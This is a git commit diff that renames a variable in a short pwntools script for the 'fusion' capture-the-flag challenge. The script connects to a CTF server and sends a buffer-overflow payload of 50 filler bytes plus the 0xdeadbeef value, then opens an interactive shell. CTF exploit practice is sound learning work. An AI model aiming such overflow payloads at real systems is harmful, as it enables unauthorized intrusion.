28f71f92c6bc89c791f290414e52a8860225e0b9
JayCee <114018721+JCPlaymaker@users.noreply.github.com>
2025-02-04 23:47:00 -0500

    Update fusion.py

--- fusion/fusion.py
+++ fusion/fusion.py
@@ -1,8 +1,8 @@
 from pwn import *
 
-re = remote('fusion.chals.ageei.org', 1337, ssl=True)
+r = remote('fusion.chals.ageei.org', 1337, ssl=True)
 
-line = re.recvline()
+line = r.recvline()
 print(line)
-re.sendline(b"A" * 50 + b"\xef\xbe\xad\xde" + b"\n")
-re.interactive()
+r.sendline(b"A" * 50 + b"\xef\xbe\xad\xde" + b"\n")
+r.interactive()
